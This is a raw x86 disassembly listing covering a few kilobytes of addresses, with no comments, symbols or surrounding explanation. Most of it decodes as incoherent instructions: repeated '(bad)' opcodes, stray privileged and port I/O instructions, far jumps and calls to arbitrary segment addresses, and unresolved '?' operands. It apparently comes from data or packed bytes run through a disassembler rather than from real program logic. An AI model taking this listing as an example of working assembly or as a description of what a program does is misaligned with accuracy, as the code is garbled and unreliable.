  42fb2b:	daa    
  42fb2c:	sub    DWORD PTR [ebp-0x3307727e],0x12edc5f5
  42fb36:	cli    
  42fb37:	pop    es
  42fb38:	neg    DWORD PTR [esi]
  42fb3a:	inc    ebp
  42fb3b:	(bad)  
  42fb3c:	cs xor dl,bh
  42fb3f:	inc    ebp
  42fb40:	cs xchg ebp,eax
  42fb42:	pushf  
  42fb43:	cmc    
  42fb44:	mov    dl,0xb3
  42fb46:	and    DWORD PTR [edx-0x41],ebp
  42fb49:	das    
  42fb4a:	sub    DWORD PTR [ebx-0x11bdf5da],ecx
  42fb50:	push   ds
  42fb51:	pop    edi
  42fb52:	or     ebp,DWORD PTR [eax+esi*4-0x5]
  42fb56:	into   
  42fb57:	hlt    
  42fb58:	call   FWORD PTR [edx+0x7ad1afda]
  42fb5e:	inc    esi
  42fb5f:	dec    edi
  42fb60:	or     BYTE PTR [edi],dh
  42fb62:	into   
  42fb63:	push   0x4a
  42fb65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb66:	jns    0x42fb6c
  42fb68:	inc    ecx
  42fb69:	fistp  DWORD PTR [ebp+0x3b]
  42fb6c:	(bad)  
  42fb6d:	pop    es
  42fb6e:	cmp    BYTE PTR [ecx-0x42],ah
  42fb71:	pop    esp
  42fb72:	cli    
  42fb73:	in     eax,dx
  42fb74:	sbb    cl,BYTE PTR [ebp-0x80]
  42fb77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb78:	pop    ss
  42fb79:	pusha  
  42fb7a:	add    BYTE PTR [esi+ebp*4],bh
  42fb7d:	xchg   DWORD PTR [esi-0x19],edx
  42fb80:	into   
  42fb81:	rcr    DWORD PTR cs:[edx+0x68774793],0xcf
  42fb89:	ret    0xfa40
  42fb8c:	pop    esp
  42fb8d:	ja     0x42fbcf
  42fb8f:	pop    edx
  42fb90:	sar    esp,cl
  42fb92:	sbb    DWORD PTR [ebx+0x25],eax
  42fb95:	add    al,0xa2
  42fb97:	or     al,0x38
  42fb99:	cmp    esp,esi
  42fb9b:	add    ah,BYTE PTR [edx+ebx*8-0x2c]
  42fb9f:	dec    ebx
  42fba0:	push   ds
  42fba1:	cmp    dh,dh
  42fba3:	loopne 0x42fb89
  42fba5:	inc    edi
  42fba6:	push   ebx
  42fba7:	daa    
  42fba8:	pusha  
  42fba9:	test   eax,0x9c47ced7
  42fbae:	leave  
  42fbaf:	push   ds
  42fbb0:	pop    ebp
  42fbb1:	jbe    0x42fb9e
  42fbb3:	jg     0x42fc24
	...
  42fc15:	add    BYTE PTR [ebx],cl
  42fc17:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc1d:	call   0x5487:0x9e5607ea
  42fc24:	sub    al,0x5b
  42fc26:	or     al,0x0
  42fc28:	add    al,BYTE PTR [eax]
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [edx],cl
  42fc2f:	jmp    0x1983:0x660080d1
  42fc36:	js     0x42fc5b
  42fc38:	stos   BYTE PTR es:[edi],al
  42fc39:	scas   eax,DWORD PTR es:[edi]
  42fc3a:	nop
  42fc3b:	push   es
  42fc3c:	cs stc 
  42fc3e:	js     0x42fc3e
  42fc40:	leave  
  42fc41:	cmp    bl,BYTE PTR [ebx*2-0x6f468e75]
  42fc48:	idiv   bl
  42fc4a:	mov    dh,0xee
  42fc4c:	loop   0x42fc49
  42fc4e:	and    ecx,DWORD PTR [edi]
  42fc50:	sbb    BYTE PTR [ecx+0x44],0xc8
  42fc54:	sub    eax,0xa80bca30
  42fc59:	push   es
  42fc5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc5b:	enter  0x177a,0xd
  42fc5f:	in     al,dx
  42fc60:	mov    eax,DWORD PTR [ebx-0x51]
  42fc63:	mov    eax,0xda142a6f
  42fc68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc69:	add    edi,DWORD PTR [eax-0x277da135]
  42fc6f:	xchg   ebx,eax
  42fc70:	mov    dh,0x3
  42fc72:	cmp    WORD PTR [edi],di
  42fc75:	xchg   edx,eax
  42fc76:	mov    edx,0x5ba008c0
  42fc7b:	dec    edi
  42fc7c:	repnz cmp dl,BYTE PTR [edi]
  42fc7f:	int    0x94
  42fc81:	les    eax,FWORD PTR [eax+0x25]
  42fc84:	repnz scas al,BYTE PTR es:[edi]
  42fc86:	lods   eax,DWORD PTR ds:[esi]
  42fc87:	mov    ebp,0xfd25308b
  42fc8c:	jbe    0x42fc4b
  42fc8e:	pop    eax
  42fc8f:	push   ebp
  42fc90:	data16 mov dl,0x40
  42fc93:	dec    eax
  42fc94:	in     al,0x8b
  42fc96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc97:	sti    
  42fc98:	sar    DWORD PTR [esi+0x781659e2],1
  42fc9e:	jo     0x42fcac
  42fca0:	out    dx,eax
  42fca1:	nop
  42fca2:	fisttp WORD PTR [edi+0x30]
  42fca5:	scas   eax,DWORD PTR es:[edi]
  42fca6:	cwde   
  42fca7:	imul   ebx,DWORD PTR [edi+0x6f],0x9
  42fcab:	push   eax
  42fcac:	sbb    al,BYTE PTR [ecx+0x2edc4c5d]
  42fcb2:	in     al,0xd1
  42fcb4:	adc    DWORD PTR [eax+edx*1],esi
  42fcb7:	ins    BYTE PTR es:[edi],dx
  42fcb8:	add    DWORD PTR [ebx],edx
  42fcba:	mov    WORD PTR [edx],ds
  42fcbc:	or     BYTE PTR [esp+edx*1+0x4cc4dbcc],cl
  42fcc3:	outs   dx,DWORD PTR ds:[esi]
  42fcc4:	xchg   ecx,eax
  42fcc5:	inc    edi
  42fcc6:	enter  0xe28e,0x1
  42fcca:	and    esi,DWORD PTR [edi]
  42fccc:	mov    fs,WORD PTR [edi]
  42fcce:	jns    0x42fc88
  42fcd0:	int    0x4b
  42fcd2:	aaa    
  42fcd3:	inc    edx
  42fcd4:	loopne 0x42fc72
  42fcd6:	stos   DWORD PTR es:[edi],eax
  42fcd7:	mov    esi,0xcae1a429
  42fcdc:	out    0x63,al
  42fcde:	fisttp QWORD PTR [edx+0x3c]
  42fce1:	inc    ebx
  42fce2:	popf   
  42fce3:	jg     0x42fcc6
  42fce5:	and    BYTE PTR [ecx+0x7bb6658c],0xbf
  42fcec:	mov    ch,BYTE PTR [ecx+0x31]
  42fcef:	mov    edi,0x6533cd70
  42fcf4:	lds    edi,FWORD PTR [ecx+0x6eefa7f9]
  42fcfa:	xchg   ecx,eax
  42fcfb:	test   BYTE PTR [edx-0x5e],0x75
  42fcff:	lods   eax,DWORD PTR ds:[esi]
  42fd00:	(bad)  [ebx]
  42fd02:	jecxz  0x42fcae
  42fd04:	sbb    al,0x53
  42fd06:	mov    eax,ds:0x886f92a2
  42fd0b:	daa    
  42fd0c:	std    
  42fd0d:	retf   0xe356
  42fd10:	lods   al,BYTE PTR ds:[esi]
  42fd11:	add    eax,0x29803491
  42fd16:	xor    DWORD PTR [ecx+0x51b4f4c4],esp
  42fd1c:	inc    eax
  42fd1d:	stos   DWORD PTR es:[edi],eax
  42fd1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd1f:	cmp    esi,edx
  42fd21:	xor    eax,DWORD PTR [eax+0x3b]
  42fd24:	lock push ss
  42fd26:	adc    DWORD PTR [edi-0x30c38e6b],edx
  42fd2c:	(bad)  
  42fd2d:	out    dx,eax
  42fd2e:	fdivr  QWORD PTR [ebp-0x7f031158]
  42fd34:	mov    ecx,0x0
	...
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x6b
  42fda3:	out    dx,al
  42fda4:	repnz not BYTE PTR [ebx]
  42fda7:	add    DWORD PTR [edx],eax
  42fda9:	add    BYTE PTR [edi],al
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    dh,al
  42fdaf:	(bad)  
  42fdb0:	in     eax,0x8a
  42fdb2:	aas    
  42fdb3:	mov    ebp,0xc6e142af
  42fdb8:	jge    0x42fda8
  42fdba:	pop    ebp
  42fdbb:	inc    esi
  42fdbc:	pop    es
  42fdbd:	jecxz  0x42fe39
  42fdbf:	push   ds
  42fdc0:	dec    edi
  42fdc1:	and    eax,0xfee4ea42
  42fdc6:	or     dl,BYTE PTR [eax]
  42fdc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fdc9:	pop    ebp
  42fdca:	and    dl,BYTE PTR ds:0x19654fca
  42fdd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fdd1:	arpl   WORD PTR [edx-0x1b0fc02],cx
  42fdd7:	xor    al,0x2c
  42fdd9:	sbb    al,0xcd
  42fddb:	xor    ebp,esp
  42fddd:	cmp    cl,bl
  42fddf:	xchg   edi,eax
  42fde0:	pop    esp
  42fde1:	push   ebp
  42fde2:	push   esi
  42fde3:	(bad)  
  42fde4:	es dec edi
  42fde6:	mov    dl,0xee
  42fde8:	and    BYTE PTR [esi],ah
  42fdea:	xor    cl,cl
  42fdec:	and    cl,BYTE PTR [edi+0x1e490a40]
  42fdf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fdf3:	xlat   BYTE PTR ds:[ebx]
  42fdf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fdf5:	ins    DWORD PTR es:[edi],dx
  42fdf6:	xchg   edx,eax
  42fdf7:	sbb    al,0xdc
  42fdf9:	nop
  42fdfa:	mul    BYTE PTR [edi-0x7a]
  42fdfd:	(bad)  
  42fdfe:	xchg   edi,eax
  42fdff:	clc    
  42fe00:	aaa    
  42fe01:	jnp    0x42fda6
  42fe03:	js     0x42fdf1
  42fe05:	shr    BYTE PTR [ebx+0x43],cl
  42fe08:	bound  edi,QWORD PTR [bx+di+0x591f]
  42fe0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe0e:	pop    ss
  42fe0f:	xchg   ebx,eax
  42fe10:	mov    edi,0xd278def
  42fe15:	mov    DWORD PTR [ecx],ebp
  42fe17:	push   ebx
  42fe18:	inc    eax
  42fe19:	xchg   DWORD PTR [ebx-0x69851e2a],edi
  42fe1f:	fwait
  42fe20:	das    
  42fe21:	xchg   esi,eax
  42fe22:	inc    esp
  42fe23:	mov    bh,0x6d
  42fe25:	push   ebx
  42fe26:	scas   al,BYTE PTR es:[di]
  42fe28:	in     eax,dx
  42fe29:	cmp    cl,BYTE PTR [edx-0x888658f]
  42fe2f:	adc    dh,BYTE PTR [eax-0x599c54ed]
  42fe35:	jp     0x42fdc9
  42fe37:	mov    bh,0x5b
  42fe39:	add    BYTE PTR [ebx-0x40d1cf6b],cl
  42fe3f:	push   eax
  42fe40:	not    DWORD PTR [ebx+0x6498876a]
  42fe46:	mov    edx,0x2d5b5c39
  42fe4b:	xor    eax,0xb0d7ca20
  42fe50:	je     0x42fe91
  42fe52:	mov    ecx,fs
  42fe54:	lds    ebp,FWORD PTR [ebx]
  42fe56:	mov    ds:0x54807151,al
  42fe5b:	mov    esp,0x3d739c71
  42fe60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe61:	add    eax,0xc612b9a0
  42fe66:	out    0x7c,eax
  42fe68:	pushf  
  42fe69:	scas   eax,DWORD PTR es:[edi]
  42fe6a:	adc    al,0xd4
  42fe6c:	iret   
  42fe6d:	cmp    bl,BYTE PTR [eax+0x23]
  42fe70:	es pop ebp
  42fe72:	adc    BYTE PTR [ebp-0x3b],ch
  42fe75:	sbb    DWORD PTR [ebp+0x48],esp
  42fe78:	shr    DWORD PTR [eax],cl
  42fe7a:	adc    al,0x7f
  42fe7c:	sbb    cl,BYTE PTR [eax+0x1e]
  42fe7f:	fwait
  42fe80:	(bad)  
  42fe81:	loop   0x42fef8
  42fe83:	in     eax,dx
  42fe84:	(bad)  
  42fe85:	sbb    eax,0xa06064f7
  42fe8a:	lahf   
  42fe8b:	push   eax
  42fe8c:	mov    eax,?
  42fe8e:	test   DWORD PTR [edi-0x515b2839],esp
  42fe94:	retf   
  42fe95:	xor    ch,bh
  42fe97:	fs mov dh,0x9e
  42fe9a:	icebp  
  42fe9b:	lods   eax,DWORD PTR ds:[esi]
  42fe9c:	ja     0x42fe4b
  42fe9e:	inc    eax
  42fe9f:	fisub  DWORD PTR [ebx+0x32]
  42fea2:	sub    eax,0x4492c82c
  42fea7:	mov    bh,al
  42fea9:	cld    
  42feaa:	mov    al,0xac
  42feac:	out    dx,eax
  42fead:	call   DWORD PTR [edi-0x64026496]
  42feb3:	retf   0x20
	...
  42ff16:	add    al,0x67
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	sbb    esp,DWORD PTR [edi-0x80]
  42ff25:	(bad)  
  42ff26:	sbb    al,BYTE PTR [edx]
  42ff28:	add    al,BYTE PTR [eax]
  42ff2a:	pop    es
  42ff2b:	add    DWORD PTR [eax],eax
  42ff2d:	add    dh,cl
  42ff2f:	push   eax
  42ff30:	jmp    0x7b6f4c89
  42ff35:	lahf   
  42ff36:	scas   al,BYTE PTR es:[edi]
  42ff37:	mov    bh,0x57
  42ff39:	cmp    bh,bh
  42ff3b:	out    0x5e,al
  42ff3d:	fdivrp st(6),st
  42ff3f:	sbb    BYTE PTR [esp+ecx*1-0x65dd809d],bl
  42ff46:	lahf   
  42ff47:	xchg   cl,dh
  42ff49:	push   0xfffffff3
  42ff4b:	(bad)  
  42ff4c:	imul   ebp,DWORD PTR [esp+ebx*2+0x6b],0xffffff9d
  42ff51:	push   ecx
  42ff52:	mov    al,ds:0xc7e0c190
  42ff57:	loope  0x42ff07
  42ff59:	iret   
  42ff5a:	sar    edi,cl
  42ff5c:	dec    ebp
  42ff5d:	push   0x7b2b7ba5
  42ff62:	imul   edx,edx,0x78
  42ff65:	mov    WORD PTR [ecx-0x21ca71e2],?
  42ff6b:	std    
  42ff6c:	daa    
  42ff6d:	or     cl,bl
  42ff6f:	jae    0x42ffa6
  42ff71:	(bad)  
  42ff73:	mov    gs,edx
  42ff75:	adc    DWORD PTR [ebx],ecx
  42ff77:	xor    eax,0xb5ac2caf
  42ff7c:	stos   BYTE PTR es:[edi],al
  42ff7d:	add    dl,BYTE PTR [ebx-0x1c]
  42ff80:	dec    edi
  42ff81:	mov    ah,0xde
  42ff83:	cmp    al,BYTE PTR [edi]
  42ff85:	aaa    
  42ff86:	xchg   esp,eax
  42ff87:	sti    
  42ff88:	leave  
  42ff89:	add    eax,0xd46d0c67
  42ff8e:	xor    edx,ebp
  42ff90:	fild   WORD PTR [edx-0x17b50060]
  42ff96:	rcr    BYTE PTR [edi-0x467d96a5],0x9b
  42ff9d:	mov    ecx,0x419964b7
  42ffa2:	adc    eax,0xbaad671
  42ffa7:	mov    al,0xe4
  42ffa9:	mov    eax,0xce0c85e
  42ffae:	inc    esp
  42ffaf:	push   ebp
  42ffb0:	sub    edi,ebp
  42ffb2:	ret    0x1947
  42ffb5:	xchg   esp,eax
  42ffb6:	mov    eax,0xd49741fd
  42ffbb:	dec    ecx
  42ffbc:	jb     0x42ffdf
  42ffbe:	push   ds
  42ffbf:	aaa    
  42ffc0:	repz inc ebp
  42ffc2:	scas   eax,DWORD PTR es:[edi]
  42ffc3:	push   ecx
  42ffc4:	push   0x6a80bd39
  42ffc9:	add    ecx,DWORD PTR [edx]
  42ffcb:	sbb    esp,DWORD PTR [ecx-0x64]
  42ffce:	or     ch,BYTE PTR [ecx-0x1e]
  42ffd1:	jl     0x42ffc8
  42ffd3:	pusha  
  42ffd4:	xchg   ebx,eax
  42ffd5:	popa   
  42ffd6:	(bad)  
  42ffd9:	mov    ebx,0xec9f8c04
  42ffde:	mov    es,edx
  42ffe0:	std    
  42ffe1:	daa    
  42ffe2:	pop    esp
  42ffe3:	daa    
  42ffe4:	xor    eax,0x23869660
  42ffe9:	sub    BYTE PTR [esi+0x34133220],0xfa
  42fff0:	ret    0xefe3
  42fff3:	mov    bl,0x36
  42fff5:	mov    al,ds:0xb0fade00
  42fffa:	fild   WORD PTR [esi+edi*4]
  42fffd:	mov    ch,0x18
  42ffff:	jmp    0x1597:0x516d0734
  430006:	cmp    esi,DWORD PTR [ecx-0x6555f8a0]
  43000c:	lods   al,BYTE PTR ds:[esi]
  43000d:	mov    al,0x6
  43000f:	sbb    ecx,DWORD PTR [ecx]
  430011:	fwait
  430012:	leave  
  430013:	adc    BYTE PTR [eax-0x15],ah
  430016:	into   
  430017:	inc    esp
  430018:	fisubr WORD PTR [ecx-0x144d46a]
  43001e:	sub    BYTE PTR [ebx+edi*8],bl
  430021:	push   es
  430022:	jmp    0x42ffe8
  430024:	add    al,0xf9
  430026:	mov    eax,0x4967f25f
  43002b:	xchg   edx,eax
  43002c:	cwde   
  43002d:	push   0x4139d32f
  430032:	cmp    dl,BYTE PTR [ebx+esi*4+0x0]
	...
  430096:	(bad)  
  430097:	ins    DWORD PTR es:[edi],dx
  430098:	aam    0xb5
  43009a:	(bad)  
  43009b:	mov    ebp,0x87aa7fe7
  4300a0:	mov    bl,0x9f
  4300a2:	push   es
  4300a3:	(bad)  
  4300a4:	test   BYTE PTR [edx+0x21],dh
  4300a7:	add    eax,DWORD PTR [edx]
  4300a9:	add    BYTE PTR [eax+eax*1+0x0],dh
  4300ad:	add    BYTE PTR [esi+edi*8-0x69],ch
  4300b1:	fucomp st(5)
  4300b3:	sti    
  4300b4:	jne    0x430036
  4300b6:	js     0x4300dc
  4300b8:	fist   WORD PTR [ebx+0x34]
  4300bb:	pop    esi
  4300bc:	inc    ebp
  4300bd:	ficomp WORD PTR [ebx+eiz*2+0x42]
  4300c1:	mov    ds:0x3b4696cb,al
  4300c6:	pop    eax
  4300c7:	cwde   
  4300c8:	fwait
  4300c9:	repz call 0x2bc9:0xd3151193
  4300d1:	cmp    BYTE PTR [edx],ch
  4300d3:	(bad)  
  4300d5:	xchg   edx,eax
  4300d6:	std    
  4300d7:	push   0xcf36d421
  4300dc:	sub    eax,0xc89b2445
  4300e1:	xor    ah,BYTE PTR [eax]
  4300e3:	push   es
  4300e4:	inc    esi
  4300e5:	adc    eax,0x6f17cd1c
  4300ea:	cmp    BYTE PTR [ecx+0x51],dh
  4300ed:	in     eax,0x73
  4300ef:	(bad)  
  4300f1:	hlt    
  4300f2:	mov    ebp,0xfbe83161
  4300f7:	das    
  4300f8:	mov    ebp,0x79b397b9
  4300fd:	jb     0x4300e7
  4300ff:	mov    DWORD PTR [eax+0x2e],esp
  430102:	inc    edx
  430103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430104:	scas   al,BYTE PTR es:[edi]
  430105:	pusha  
  430106:	cmp    al,0xd0
  430108:	dec    edi
  430109:	loope  0x4300b9
  43010b:	lds    ecx,FWORD PTR [esp+ecx*1+0xf7fb4c0]
  430112:	nop
  430113:	jge    0x430100
  430115:	bnd ja 0x430139
  430118:	or     BYTE PTR [edx],0x9d
  43011b:	test   DWORD PTR [edx+esi*4],edi
  43011e:	add    DWORD PTR [ebp-0x48],ecx
  430121:	adc    al,0x0
	...
  430193:	add    BYTE PTR [eax],al
  430195:	add    BYTE PTR [ebp+0x55],cl
  430198:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43019e:	mov    esp,ebp
  4301a0:	or     al,ah
  4301a2:	dec    ebp
  4301a3:	add    bh,al
  4301a5:	add    BYTE PTR [eax],cl
  4301a7:	add    BYTE PTR [eax],al
  4301a9:	mov    DWORD PTR [eax],0x3ef44545
  4301af:	xor    eax,0x9c8b8500
  4301b4:	hlt    
  4301b5:	clc    
  4301b6:	retf   
  4301b7:	(bad)  
  4301b8:	enter  0x4d45,0xb8
  4301bc:	mov    esi,DWORD PTR [esp+esi*8]
  4301bf:	test   ebx,ecx
  4301c1:	pushf  
  4301c2:	enter  0x4df8,0x8b
  4301c6:	mov    DWORD PTR [ebp+0x8],0x894708
  4301cd:	inc    ebp
  4301ce:	mov    ebp,0xff8bfffc
  4301d3:	dec    ebp
  4301d4:	mov    ch,0xf4
  4301d6:	call   DWORD PTR [ebx-0x1]
  4301d9:	mov    ebx,0x8005322
  4301de:	call   DWORD PTR [ecx+0x8]
  4301e1:	pop    es
  4301e2:	jmp    0xb8:0x9cb4533
  4301e9:	call   0xc3:0x32f4728b
  4301f0:	call   0x8989:0x3c83203
  4301f7:	dec    ebp
  4301f8:	or     ah,al
  4301fa:	inc    ebp
  4301fb:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430201:	xor    eax,DWORD PTR [eax]
  430203:	retf   
  430204:	ret    
  430205:	add    eax,esi
  430207:	enter  0x8945,0x64
  43020b:	dec    ebp
  43020c:	sbb    ah,cl
  43020e:	add    BYTE PTR [ebx-0xb87b277],cl
  430214:	dec    DWORD PTR [ebx-0xbcfb275]
  43021a:	test   DWORD PTR [ebx],esi
  43021c:	dec    ebx
  43021e:	inc    DWORD PTR [ebx]
  430220:	inc    eax
  430221:	enter  0x8989,0x64
  430225:	(bad)  
  430226:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43022a:	cld    
  43022b:	dec    DWORD PTR [ebp-0xa90001]
  430231:	push   edi
  430232:	mov    BYTE PTR [edx+0x1],ch
  430235:	and    BYTE PTR [eax],al
  430237:	pop    ecx
  430238:	inc    ebp
  430239:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43023f:	push   0xffffff89
  430241:	pop    ecx
  430242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430243:	dec    ebp
  430244:	add    BYTE PTR [ecx+0x45fc088b],cl
  43024a:	jne    0x430294
  43024c:	lea    eax,[eax]
  43024e:	fs (bad) 
  430250:	dec    DWORD PTR [eax]
  430252:	mov    DWORD PTR [eax],eax
  430254:	test   al,0x0
  430256:	add    BYTE PTR [ebp-0x18],cl
  430259:	xor    ebp,DWORD PTR [edx]
  43025b:	add    eax,DWORD PTR [eax]
  43025d:	mov    eax,eax
  43025f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430266:	inc    ebp
  430267:	mov    DWORD PTR [ebx+0x459408],ecx
  43026d:	popa   
  43026e:	mov    esp,DWORD PTR [ebp-0x75]
  430271:	(bad)  
  430272:	cld    
  430273:	inc    eax
  430274:	cmp    bh,0x1
  430277:	lea    eax,[eax]
  430279:	and    BYTE PTR [eax],al
  43027b:	inc    DWORD PTR [ecx-0x18]
  43027e:	mov    ecx,DWORD PTR [ebx]
  430280:	cld    
  430281:	add    BYTE PTR [ecx+0x75014d],cl
  430287:	(bad)  
  430288:	xchg   ebp,eax
  430289:	sar    bh,1
  43028b:	inc    eax
  43028c:	inc    DWORD PTR [eax]
  43028e:	mov    eax,DWORD PTR [ebp-0x4]
  430291:	xor    edx,DWORD PTR [edx+0x7201be]
  430297:	add    BYTE PTR [edx],dl
  430299:	(bad)  
  43029a:	nop
  43029b:	inc    ebp
  43029c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302a2:	mov    al,0xff
  4302a4:	add    bh,bh
  4302a6:	add    BYTE PTR [ebx],dh
  4302a8:	inc    DWORD PTR [ebx]
  4302aa:	sbb    al,0x89
  4302ac:	jne    0x43028a
  4302ae:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302b4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302ba:	mov    DWORD PTR [eax-0x70],0xee70e989
  4302c1:	inc    DWORD PTR [ebp-0x75]
  4302c4:	(bad)  [esp+ebp*8]
  4302c7:	test   DWORD PTR [esi-0x1],esp
  4302ca:	inc    ebp
  4302cb:	(bad)  
  4302cc:	aas    
  4302cd:	inc    ebp
  4302ce:	(bad)  
  4302cf:	lea    edi,[eax+edi*2-0x1]
  4302d3:	inc    edi
  4302d5:	mov    DWORD PTR [ecx],edi
  4302d7:	mov    al,ds:0x8b8000c7
  4302dc:	out    dx,al
  4302dd:	cld    
  4302de:	loopne 0x43026d
  4302e0:	inc    ebp
  4302e1:	(bad)  
  4302e2:	in     al,dx
  4302e3:	(bad)  
  4302e4:	fisttp WORD PTR [eax+0x8801c7]
  4302ea:	jecxz  0x430331
  4302ec:	out    dx,al
  4302ed:	inc    DWORD PTR [ebp-0x4]
  4302f0:	out    0x8d,eax
  4302f2:	aas    
  4302f3:	(bad)  
  4302f4:	call   0xcb2df8
  4302f9:	add    DWORD PTR [ebx-0x7f590400],ecx
  4302ff:	add    BYTE PTR [ecx],al
  430301:	test   DWORD PTR [eax],eax
  430303:	wrmsr  
  430305:	jae    0x4302f2
  430307:	add    BYTE PTR [eax],al
  430309:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43030f:	add    esp,edi
  430311:	add    BYTE PTR [eax+0x450108],al
  430317:	mov    edi,DWORD PTR [ebp-0x6c]
  43031a:	add    DWORD PTR [eax],0x4
  43031d:	mov    eax,DWORD PTR [ebp+0x3]
  430320:	mov    edi,DWORD PTR [esp+edi*8]
  430323:	dec    ebp
  430324:	nop
  430325:	mov    eax,DWORD PTR [ecx]
  430327:	fadd   DWORD PTR [eax]
  430329:	add    BYTE PTR [ecx*4-0xafa000],al
  430330:	inc    ebp
  430331:	push   edx
  430332:	call   DWORD PTR [ebp-0x7b]
  430335:	mov    esi,DWORD PTR [ebp-0x74]
  430338:	mov    eax,DWORD PTR [eax]
  43033a:	cld    
  43033b:	mov    eax,DWORD PTR [eax+0x880103]
  430341:	add    BYTE PTR [ebp+0x6a],bh
  430344:	cmp    edi,0x10
  430347:	mov    WORD PTR [ebp+0x0],es
  43034a:	mov    edx,DWORD PTR [edx-0x4]
  43034d:	push   ecx
  43034e:	nop
  43034f:	inc    DWORD PTR [ecx]
  430351:	cld    
  430352:	add    BYTE PTR [ebp-0x26],bh
  430355:	mov    eax,DWORD PTR [eax]
  430357:	cld    
  430358:	push   eax
  430359:	nop
  43035a:	inc    ebp
  43035b:	add    edi,edi
  43035d:	add    BYTE PTR [ebx+0x4de0f445],cl
  430363:	call   0x9446ca9b
  430368:	cmp    esp,ebx
  43036a:	movntq QWORD PTR [esi],mm6
  43036d:	mov    DWORD PTR [eax],0xb87c8b98
  430373:	test   ebx,eax
  430375:	jmp    DWORD PTR [esi-0x1]
  430378:	int    0xe9
  43037a:	sub    esp,esp
  43037c:	add    eax,DWORD PTR [ebp-0x30]
  43037f:	fild   WORD PTR [ebp+0x3f]
  430382:	cmp    eax,edi
  430384:	je     0xc243e7a6
  43038a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430391:	(bad)  
  430392:	jne    0x430320
  430394:	mov    ebx,ecx
  430396:	cld    
  430397:	jl     0x4303de
  430399:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43039f:	inc    ebp
  4303a0:	call   0xeb2d30
  4303a5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303ab:	add    DWORD PTR es:[eax],eax
  4303ae:	add    al,al
  4303b0:	xor    BYTE PTR [eax+0x3f],dl
  4303b3:	inc    ebp
  4303b4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303ba:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4303c0:	add    DWORD PTR [ecx+0x458be845],ecx
  4303c6:	fmul   DWORD PTR [ebx+0x8bb800]
  4303cc:	cld    
  4303cd:	call   0xd82e92
  4303d2:	dec    DWORD PTR [ebx+0x108ee8ff]
  4303d8:	add    al,al
  4303da:	push   eax
  4303db:	es inc ebp
  4303dd:	inc    ebp
  4303de:	mov    ecx,DWORD PTR [ebx+0xd89c]
  4303e4:	dec    DWORD PTR [ebx-0x3ff70301]
  4303ea:	mov    DWORD PTR gs:[eax],eax
  4303ed:	call   0x8b6b49b2
  4303f2:	inc    ebp
  4303f3:	mov    eax,0xe8d8008b
  4303f8:	add    BYTE PTR [ecx],ch
  4303fa:	mov    eax,DWORD PTR [eax]
  4303fc:	cld    
  4303fd:	mov    eax,eax
  4303ff:	call   0x462b1459
  430404:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43040a:	cld    
  43040b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430412:	xor    BYTE PTR [eax],al
  430414:	push   edi
  430415:	inc    ebp
  430416:	mov    DWORD PTR [ebx],esi
  430418:	in     al,0xb9
  43041a:	inc    ebp
  43041b:	lea    ecx,[ebx-0x3c370301]
  430421:	dec    ebp
  430422:	call   0x8dc1:0x308328b
  430429:	xchg   DWORD PTR [eax+0x1],eax
  43042c:	inc    DWORD PTR [eax]
  43042e:	call   0x432d78
  430433:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  430439:	jge    0x43046e
  43043b:	mov    eax,DWORD PTR [ebx]
  43043d:	cld    
  43043e:	lea    edx,[eax+0xff0120]
  430444:	call   0x432dd6
  430449:	push   eax
  43044a:	inc    DWORD PTR [ebp-0x1c]
  43044d:	mov    ecx,DWORD PTR [ebp-0x58]
  430450:	xor    eax,DWORD PTR [eax]
  430452:	add    edi,edi
  430454:	cmp    ebp,eax
  430456:	jne    0x43047e
  430458:	mov    DWORD PTR [eax],0x8b004dd8
  43045e:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  430465:	mov    eax,ebx
  430467:	cld    
  430468:	test   BYTE PTR [eax+0x32019a],bh
  43046e:	mov    DWORD PTR [ebp+0x8],esi
  430471:	xor    eax,DWORD PTR [ebp-0x73]
  430474:	test   DWORD PTR [esp+esi*2-0x1],edi
  430478:	mov    ebp,eax
  43047a:	mov    eax,0x33004d29
  43047f:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430485:	add    DWORD PTR [eax],eax
  430487:	add    BYTE PTR [ebp+0x30],al
